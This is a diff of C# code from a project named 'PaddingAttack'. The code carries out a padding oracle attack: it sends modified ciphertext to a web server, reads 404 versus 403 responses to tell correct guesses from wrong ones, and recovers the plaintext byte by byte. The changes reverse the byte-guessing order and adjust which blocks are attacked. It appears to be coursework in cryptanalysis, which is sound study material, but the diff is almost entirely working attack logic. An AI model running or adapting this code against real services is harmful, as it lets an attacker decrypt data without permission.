@@ -66,7 +66,7 @@ namespace PaddingAttack
 				if ((e.Error == null && e.Result != null) || response.StatusCode == HttpStatusCode.NotFound)
 				{
 					// correct guess
-					_result[15 - correctGuess.Position] = correctGuess.Code;
+                    _result[15 - correctGuess.Position] = correctGuess.Code;
 
 					// finish to decipher a block
 					if (correctGuess.Position + 1 >= 16)
@@ -74,8 +74,8 @@ namespace PaddingAttack
 						_message += CipherHelper.GetASCIIString(_result);
 						OnFinishGuess();
 						_result = new byte[16];
-						nextSymbolGuess = new Suggestion(0, 0, correctGuess.Block + 1);
-						if (nextSymbolGuess.Block >= 4)
+						nextSymbolGuess = new Suggestion(255, 0, correctGuess.Block + 1);
+						if (nextSymbolGuess.Block >= 3)
 						{
 							// finish attack
 							return;
@@ -83,15 +83,15 @@ namespace PaddingAttack
 					}
 					else
 					{
-						nextSymbolGuess = new Suggestion(0, (byte)(correctGuess.Position + 1), correctGuess.Block);
+						nextSymbolGuess = new Suggestion(255, (byte)(correctGuess.Position + 1), correctGuess.Block);
 					}
 				}
 				else if (response.StatusCode == HttpStatusCode.Forbidden)
 				{
 					// incorrect guess
-					if (correctGuess.Code == 255)
+					if (correctGuess.Code == 0)
 						throw new ArgumentException("All suggestions are incorrect");
-					nextSymbolGuess = new Suggestion((byte)(correctGuess.Code + 1), correctGuess.Position, correctGuess.Block);
+					nextSymbolGuess = new Suggestion((byte)(correctGuess.Code - 1), correctGuess.Position, correctGuess.Block);
 				}
 				else
 				{
@@ -122,11 +122,10 @@ namespace PaddingAttack
 		{
 			string result = String.Empty;
 			var index = 0;
-			do
+            while (index < guess.Block)
 			{
-				result += _cipherText[index];
-				index++;
-			} while (index < guess.Block);
+				result += _cipherText[index++];
+			}
 			var cipherBytes = CipherHelper.ConvertFromHexString(_cipherText[guess.Block]).ToArray<byte>();
 			var guessBytes = GetGeussBytes(guess);
 			var attackerBytes = CipherHelper.Xor(cipherBytes, guessBytes).ToArray<byte>();
@@ -137,7 +136,7 @@ namespace PaddingAttack
 		}
 
 		public void Start(){
-			var firstGuess = new Suggestion(0, 0, 2);
+			var firstGuess = new Suggestion(255, 0, 0);
 			SendMessage(firstGuess);
 		}
 
